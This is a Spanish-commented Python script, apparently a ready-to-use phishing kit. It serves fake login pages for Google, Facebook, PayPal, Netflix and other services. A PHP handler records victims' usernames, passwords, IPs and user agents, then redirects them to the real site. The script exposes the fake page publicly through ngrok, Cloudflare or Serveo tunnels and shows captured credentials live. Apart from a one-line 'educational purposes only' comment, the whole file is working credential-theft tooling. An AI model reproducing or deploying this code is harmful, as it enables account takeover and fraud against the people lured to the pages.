#!/usr/bin/env python3
import os, sys, shutil, platform, subprocess, time, threading, requests
from datetime import datetime

NGROK_API = "http://127.0.0.1:4040/api/tunnels"
CF_BIN = "./cloudflared"
PORT = 8080

# ========== PLANTILLAS DISPONIBLES ==========
TEMPLATES = {
    "1": {"name": "Google", "file": "google.html"},
    "2": {"name": "Facebook", "file": "facebook.html"},
    "3": {"name": "Instagram", "file": "instagram.html"},
    "4": {"name": "Discord", "file": "discord.html"},
    "5": {"name": "Roblox", "file": "roblox.html"},
    "6": {"name": "Minecraft", "file": "minecraft.html"},
    "7": {"name": "Steam", "file": "steam.html"},
    "8": {"name": "PayPal", "file": "paypal.html"},
    "9": {"name": "Mercado Libre", "file": "mercadolibre.html"},
    "10": {"name": "Netflix", "file": "netflix.html"},
    "11": {"name": "Spotify", "file": "spotify.html"},
    "12": {"name": "Amazon", "file": "amazon.html"},
    "13": {"name": "Microsoft", "file": "microsoft.html"},
    "14": {"name": "ICloud", "file": "icloud.html"},
    "15": {"name": "WhatsApp", "file": "whatsapp.html"},
}

# ========== UTILIDADES ==========
def arch() -> str:
    m = platform.machine().lower()
    if m in ("x86_64", "amd64"): return "amd64"
    if m in ("i386", "i686"): return "386"
    if m.startswith("armv7"): return "arm"
    if m.startswith("arm") or m == "aarch64": return "arm64"
    return "amd64"

def dl(bin_url: str, name: str) -> None:
    if os.path.exists(name): return
    print(f"[*] Descargando {name}...")
    subprocess.run(f'curl -sL "{bin_url}" -o {name} && chmod +x {name}', shell=True)

def dl_ngrok() -> None:
    if shutil.which("ngrok"): return
    syst = platform.system().lower()
    ext = "zip" if syst == "windows" else "tgz"
    url = f"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-{syst}-{arch()}.{ext}"
    subprocess.run(f'curl -sL "{url}" | tar -xz ngrok 2>/dev/null || unzip -q ngrok.zip', shell=True)
    if os.path.exists("ngrok"):
        os.chmod("ngrok", 0o755)

def dl_cf() -> None:
    syst = platform.system().lower()
    url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-{syst}-{arch()}"
    dl(url, CF_BIN)

# ========== TÚNELES ==========
def ngrok_url(port: int) -> str:
    dl_ngrok()
    subprocess.Popen(["./ngrok", "http", str(port)], 
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[*] Esperando túnel ngrok...")
    for _ in range(30):
        try:
            resp = requests.get(NGROK_API, timeout=2).json()
            if resp.get("tunnels"):
                return resp["tunnels"][0]["public_url"].replace("http://", "").replace("https://", "")
        except:
            pass
        time.sleep(1)
    return None

def cf_url(port: int) -> str:
    dl_cf()
    proc = subprocess.Popen([CF_BIN, "tunnel", "--url", f"http://127.0.0.1:{port}"],
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    print("[*] Esperando túnel Cloudflare...")
    for ln in proc.stdout:
        if "https://" in ln and "trycloudflare" in ln:
            return ln.split("https://")[1].split()[0].strip()
    return None

# ========== SITIO ==========
def prepare_site(template_choice: str) -> None:
    if os.path.exists("site"):
        shutil.rmtree("site")
    
    os.makedirs("site/templates", exist_ok=True)
    os.makedirs("site/logs", exist_ok=True)
    
    # Copiar plantilla seleccionada
    template_file = TEMPLATES[template_choice]["file"]
    template_name = TEMPLATES[template_choice]["name"]
    
    if os.path.exists(f"templates/{template_file}"):
        shutil.copy(f"templates/{template_file}", "site/index.html")
    else:
        print(f"[!] Advertencia: templates/{template_file} no encontrado, usando predeterminada")
        create_default_template(template_name)
    
    # Crear handler PHP
    create_handler()
    
    # Crear archivos de log
    open("site/logs/credentials.txt", "a").close()
    open("site/logs/access.log", "a").close()
    
    print(f"[✓] Sitio preparado con plantilla: {template_name}")

def create_default_template(service: str) -> None:
    """Crea una plantilla básica si no existe"""
    html = f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - {service}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; }}
        .container {{ min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }}
        .login-box {{ background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }}
        .logo {{ text-align: center; margin-bottom: 30px; font-size: 32px; font-weight: bold; color: #1877f2; }}
        .form-group {{ margin-bottom: 20px; }}
        label {{ display: block; margin-bottom: 8px; color: #333; font-weight: 500; }}
        input {{ width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }}
        input:focus {{ outline: none; border-color: #1877f2; }}
        button {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; }}
        button:hover {{ background: #166fe5; }}
        .footer {{ text-align: center; margin-top: 20px; color: #666; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">{service}</div>
            <form action="handler.php" method="POST">
                <div class="form-group">
                    <label>Usuario o Email</label>
                    <input type="text" name="username" required>
                </div>
                <div class="form-group">
                    <label>Contraseña</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit">Iniciar sesión</button>
            </form>
            <div class="footer">© 2024 {service}. Todos los derechos reservados.</div>
        </div>
    </div>
</body>
</html>"""
    
    with open("site/index.html", "w", encoding="utf-8") as f:
        f.write(html)

def create_handler() -> None:
    """Crea el handler PHP para capturar credenciales"""
    php_code = """<?php
// ⚠️ SOLO PARA PROPÓSITOS EDUCATIVOS

// Capturar datos
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$username = $_POST['username'] ?? $_POST['email'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';

// Capturar todos los POST data
$all_data = $_POST;

// Log detallado
$log_entry = "
═══════════════════════════════════════════════════════════
⏰ Timestamp: {$timestamp}
📍 IP: {$ip}
🌐 User-Agent: {$user_agent}
👤 Username: {$username}
🔑 Password: {$password}
📦 All POST Data: " . json_encode($all_data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "
═══════════════════════════════════════════════════════════
";

// Guardar en archivo
file_put_contents('logs/credentials.txt', $log_entry, FILE_APPEND);

// Log de acceso
$access_log = "[{$timestamp}] IP: {$ip} | User: {$username}\n";
file_put_contents('logs/access.log', $access_log, FILE_APPEND);

// Redirección (puedes cambiar esto)
$redirect_urls = [
    'google' => 'https://accounts.google.com',
    'facebook' => 'https://www.facebook.com',
    'instagram' => 'https://www.instagram.com',
    'discord' => 'https://discord.com/login',
    'roblox' => 'https://www.roblox.com',
    'minecraft' => 'https://www.minecraft.net',
    'default' => 'https://www.google.com'
];

// Detectar servicio por referrer o usar default
$service = 'default';
header("Location: " . $redirect_urls[$service]);
exit;
?>"""
    
    with open("site/handler.php", "w", encoding="utf-8") as f:
        f.write(php_code)

def php_server(port: int) -> None:
    subprocess.run(["php", "-S", f"0.0.0.0:{port}", "-t", "site"],
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
def monitor_logs():
    """Monitorea logs en tiempo real"""
    log_file = "site/logs/credentials.txt"
    access_file = "site/logs/access.log"
    
    print("\n" + "="*60)
    print("👁️  MONITOR DE ACTIVIDAD EN TIEMPO REAL")
    print("="*60)
    print("📝 Presiona Ctrl+C para detener\n")

    if not os.path.exists(log_file):
        open(log_file, 'a').close()
    if not os.path.exists(access_file):
        open(access_file, 'a').close()
    
    # Posición inicial en ambos archivos
    with open(log_file, 'r') as f:
        f.seek(0, 2)
        credentials_pos = f.tell()
    
    with open(access_file, 'r') as f:
        f.seek(0, 2)
        access_pos = f.tell()
    
    print("⏳ Esperando actividad...\n")
    
    while True:
        try:
            # Monitorear accesos (IPs)
            with open(access_file, 'r') as f:
                f.seek(access_pos)
                new_access = f.read()
                if new_access:
                    for line in new_access.strip().split('\n'):
                        if line:
                            print(f"🌐 {line}")
                    access_pos = f.tell()
            
            # Monitorear credenciales capturadas
            with open(log_file, 'r') as f:
                f.seek(credentials_pos)
                new_creds = f.read()
                if new_creds:
                    print("\n" + "🚨 " + "="*55)
                    print("   ¡CREDENCIALES CAPTURADAS!")
                    print("="*58)
                    print(new_creds)
                    credentials_pos = f.tell()
            
            time.sleep(0.5)
            
        except Exception as e:
            time.sleep(1)



    if not os.path.exists(log_file):
        return
    
    with open(log_file, 'r') as f:
        f.seek(0, 2)  # Ir al final del archivo
        while True:
            line = f.readline()
            if line:
                print(line, end='')
            else:
                time.sleep(0.5)




def serveo_url(port: int) -> str:
    """Túnel Serveo - pasa IPs reales sin necesidad de cuenta"""
    import random, string
    subdomain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    
    print(f"[*] Conectando a Serveo con subdominio: {subdomain}")
    proc = subprocess.Popen(
        ["ssh", "-o", "StrictHostKeyChecking=no", "-R", 
         f"{subdomain}:80:localhost:{port}", "serveo.net"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    
    for line in proc.stdout:
        print(f"[DEBUG] {line.strip()}")
        if "Forwarding HTTP" in line and "https://" in line:
            try:
                url = line.split("https://")[1].split()[0].strip()
                return url
            except:
                pass
    return None








# ========== MAIN ==========
def banner():
    print(r"""
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗    ███████╗██████╗    ║
║   ██╔══██╗██║  ██║██║██╔════╝██║  ██║    ██╔════╝██╔══██╗   ║
║   ██████╔╝███████║██║███████╗███████║    █████╗  ██║  ██║   ║
║   ██╔═══╝ ██╔══██║██║╚════██║██╔══██║    ██╔══╝  ██║  ██║   ║
║   ██║     ██║  ██║██║███████║██║  ██║    ███████╗██████╔╝   ║
║   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═════╝    ║
║                                                             ║ 
║                 ║ 3 Lenguajes  ║
                    Ruby  ║
║                           ║ PHP ║ 
║                               ║ Python                                 
╚═══════════════════════════════════════════════════════════════╝
    """)

def show_templates():
    print("\n📋 PLANTILLAS DISPONIBLES:\n")
    for key, value in sorted(TEMPLATES.items(), key=lambda x: int(x[0])):
        print(f"  [{key:>2}] {value['name']}")
    print()

def main() -> None:
    banner()
    
    # Verificar PHP
    if not shutil.which("php"):
        print("❌ PHP no está instalado. Instálalo primero: apt install php-cli")
        sys.exit(1)
    
    # Seleccionar plantilla
    show_templates()
    template = input("🎯 Selecciona plantilla [1-15]: ").strip()
    
    if template not in TEMPLATES:
        print("❌ Opción inválida")
        sys.exit(1)
    
    # Preparar sitio
    prepare_site(template)
    
    # Iniciar servidor PHP
    threading.Thread(target=php_server, args=(PORT,), daemon=True).start()
    time.sleep(1.5)
    
    # Seleccionar túnel
    print("\n🌐 OPCIONES DE TÚNEL:")
    print("  [1] Ngrok (recomendado para iplogear, y mucho.)")
    print("  [2] Cloudflare TryCloudflare (No recomendado para iplogear, no da ips)")
    print("  [3] Serveo (Muy bueno para ambos)")
    
    tunnel_opt = input("\n🔌 Selecciona túnel [1/2]: ").strip()
    
    url = None
    if tunnel_opt == "1":
        url = ngrok_url(PORT)
    elif tunnel_opt == "2":
        url = cf_url(PORT)
    elif tunnel_opt == "3":
        url = serveo_url(PORT)
    
    if not url:
        print("❌ Error al crear túnel")
        sys.exit(1)
    
    # Mostrar información
    print("\n" + "="*60)
    print(f"✅ SERVIDOR ACTIVO")
    print("="*60)
    print(f"🔗 URL Pública    : https://{url}")
    print(f"📊 Panel Local    : http://localhost:{PORT}")
    print(f"📁 Logs           : site/logs/credentials.txt")
    print(f"🎯 Plantilla      : {TEMPLATES[template]['name']}")
    print("="*60)
    print("\n💡 Comandos útiles:")
    print(f"   tail -f site/logs/credentials.txt   # Ver logs en tiempo real")
    print(f"   cat site/logs/credentials.txt        # Ver todos los logs")    
    # Monitorear logs
    try:
        monitor_logs()
    except KeyboardInterrupt:
        print("\n\n[🛑] Cerrando servidor...")
        print("[✓] Logs guardados en site/logs/")

if __name__ == "__main__":
    main()